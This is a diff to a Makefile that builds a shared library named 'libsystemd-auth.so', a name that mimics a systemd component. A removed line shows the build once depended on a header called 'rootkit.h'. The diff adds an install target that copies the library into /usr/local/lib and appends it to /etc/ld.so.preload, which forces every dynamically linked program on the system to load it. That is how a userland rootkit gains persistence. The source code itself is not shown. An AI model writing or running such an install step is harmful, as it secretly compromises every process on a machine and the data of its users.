@@ -2,18 +2,22 @@ CC = gcc
 CFLAGS = -Wall -fPIC -D_GNU_SOURCE
 LDFLAGS = -shared -ldl
 TARGET = libsystemd-auth.so
-SRCS = main.c
-OBJS = $(SRCS:.c=.o)
+SRC = main.c
+OBJ = main.o
 
 all: $(TARGET)
 
-$(TARGET): $(OBJS)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+$(TARGET): $(OBJ)
+	$(CC) $(CFLAGS) -o $(TARGET) $(OBJ) $(LDFLAGS)
 
-%.o: %.c rootkit.h
-	$(CC) $(CFLAGS) -c $< -o $@
+$(OBJ): $(SRC)
+	$(CC) $(CFLAGS) -c $(SRC) -o $(OBJ)
 
 clean:
-	rm -f $(OBJS) $(TARGET)
+	rm -f $(OBJ) $(TARGET)
 
-.PHONY: all clean
+install:
+	cp $(TARGET) /usr/local/lib/
+	echo "/usr/local/lib/$(TARGET)" >> /etc/ld.so.preload
+
+.PHONY: all clean install
